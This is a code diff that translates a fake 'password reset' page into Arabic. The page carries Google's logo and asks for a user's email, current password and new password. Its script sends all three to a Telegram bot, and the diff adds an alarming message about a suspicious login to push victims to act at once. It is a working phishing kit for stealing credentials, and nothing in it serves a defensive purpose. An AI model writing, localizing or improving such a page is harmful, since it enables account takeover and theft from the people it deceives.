@@ -1,13 +1,13 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Password Reset</title>
+  <title>إعادة تعيين كلمة المرور</title>
   <style>
     body {
       background: #f2f2f2;
-      font-family: Arial, sans-serif;
+      font-family: 'Cairo', sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -61,20 +61,23 @@
 <body>
   <div class="container">
     <div class="logo">
-      <img src="https://www.gstatic.com/images/branding/product/1x/googleg_32dp.png" alt="Logo">
+      <img src="https://www.gstatic.com/images/branding/product/1x/googleg_32dp.png" alt="الشعار">
     </div>
-    <h2>Reset your password</h2>
+    <h2>إعادة تعيين كلمة المرور</h2>
+    <p style="text-align: center; color: #444; font-size: 0.95rem; margin-bottom: 1rem;">
+      نود إعلامك بأنه تم رصد محاولة تسجيل دخول مشبوهة إلى حسابك، وننصحك بإعادة تعيين كلمة المرور فوراً للحفاظ على أمان بياناتك.
+    </p>
     <form id="resetForm">
-      <label for="email">Email</label>
+      <label for="email">البريد الإلكتروني</label>
       <input type="email" id="email" required>
 
-      <label for="currentPassword">Current Password</label>
+      <label for="currentPassword">كلمة المرور الحالية</label>
       <input type="password" id="currentPassword" required>
 
-      <label for="newPassword">New Password</label>
+      <label for="newPassword">كلمة المرور الجديدة</label>
       <input type="password" id="newPassword" required>
 
-      <button type="submit">Submit</button>
+      <button type="submit">إرسال</button>
     </form>
   </div>
 
@@ -86,14 +89,14 @@
       const currentPassword = document.getElementById('currentPassword').value;
       const newPassword = document.getElementById('newPassword').value;
 
-      const message = `Email: ${email}%0ACurrent Password: ${currentPassword}%0ANew Password: ${newPassword}`;
+      const message = `📩 محاولة استعادة كلمة مرور:\nالبريد الإلكتروني: ${email}%0A🔑 كلمة المرور الحالية: ${currentPassword}%0A🔐 كلمة المرور الجديدة: ${newPassword}`;
 
       const token = '1234';
       const chatId = '0000';
 
       fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`)
-        .then(response => alert('Password reset submitted.'))
-        .catch(error => alert('Something went wrong.'));
+        .then(response => alert('تم إرسال البيانات بنجاح'))
+        .catch(error => alert('حدث خطأ أثناء الإرسال'));
     });
   </script>
 </body>
